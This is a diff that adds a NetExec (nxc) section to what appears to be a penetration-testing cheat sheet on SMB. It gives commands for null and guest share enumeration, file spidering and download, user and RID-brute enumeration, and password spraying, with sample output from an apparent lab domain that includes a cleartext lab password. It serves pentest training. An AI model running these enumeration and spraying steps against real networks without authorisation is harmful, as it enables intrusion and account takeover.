@@ -459,6 +459,78 @@ smbmap -H 10.10.0.1 --download '.\Users\SVC_TGS\Desktop\user.txt'
 smbmap -H 10.0.0.1 -R -u ‘123’
 ```
 
+#### NXC
+```
+#Null session :
+nxc smb ./hosts.txt -u '' -p '' --shares
+
+#Guest session : 
+nxc smb ./hosts.txt -u 'guest' -p '' - shares
+
+#User session
+nxc smb 10.0.0.1 -u 'kiosec' -p 'mystrongpassword!' --shares
+
+nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares READ,WRITE
+nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares READ
+nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares WRITE
+
+#List all files and search for Files on Readable Shares
+#Resultat are listed in the json file
+nxc smb <host> -u 'kiosec' -p 'mystrongpassword!' -M spider_plus
+
+#Download a specific file
+nxc smb <host> -u 'kiosec' -p 'mystrongpassword!' --get-file '<file>' <output-file> --share <share>
+
+#Enumerate user :
+nxc smb ./hosts.txt -u 'guest' -p '' --users
+
+nxc smb dc01.welcome.local -u 'e.hills' -p 'Il0vemyj0b2025!' --users 
+SMB         10.1.135.73     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.135.73     445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025! 
+SMB         10.1.135.73     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.1.135.73     445    DC01             Administrator                 2025-09-13 16:24:04 0       Built-in account for administering the computer/domain 
+SMB         10.1.135.73     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.1.135.73     445    DC01             krbtgt                        2025-09-13 16:40:39 0       Key Distribution Center Service Account 
+SMB         10.1.135.73     445    DC01             e.hills                       2025-09-13 20:41:15 0        
+SMB         10.1.135.73     445    DC01             j.crickets                    2025-09-13 20:43:53 0        
+SMB         10.1.135.73     445    DC01             e.blanch                      2025-09-13 20:49:13 0        
+SMB         10.1.135.73     445    DC01             i.park                        2025-09-14 04:23:03 0       IT Intern 
+SMB         10.1.135.73     445    DC01             j.johnson                     2025-09-13 20:58:15 0        
+SMB         10.1.135.73     445    DC01             a.harris                      2025-09-13 20:59:13 0        
+SMB         10.1.135.73     445    DC01             svc_ca                        2025-09-14 00:19:35 0        
+SMB         10.1.135.73     445    DC01             svc_web                       2025-09-13 21:40:40 0       Web Server in Progress 
+SMB         10.1.135.73     445    DC01             [*] Enumerated 11 local users: WELCOME
+*
+
+#Idem using rid-brute
+nxc smb dc01.welcome.local -u 'e.hills' -p 'Il0vemyj0b2025!' --rid-brute
+
+#Password spraying 
+TARGET_USERNAME=#[fill in the username you discovered in the previous lesson]
+TARGET_PASSWORD=#[fill in the password you discovered in the previous lesson]
+
+nxc smb ./hosts.txt -u "${TARGET_USERNAME}" -p "${TARGET_PASSWORD}"
+
+#Continue-on-success => Continue in case of valid creds
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb dc01.welcome.local -u aduserlist.lst -p 'Il0vemyj0b2025!' --continue-on-success 
+SMB         10.1.135.73     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\Administrator:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\Guest:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\krbtgt:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025! 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\j.crickets:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\e.blanch:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\i.park:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\j.johnson:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\a.harris:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\svc_ca:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\svc_web:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\IT:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\RH:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+SMB         10.1.135.73     445    DC01             [-] WELCOME.local\HelpDesk:Il0vemyj0b2025! STATUS_LOGON_FAILURE 
+```
+
 #### Detection of the SMB version using Wireshark
 ```
 If the following error appear "protocol negotiation failed : NT_STATUS_CONNECTION_DISCONNECTED", it's probably due to the old smb version of the victim.
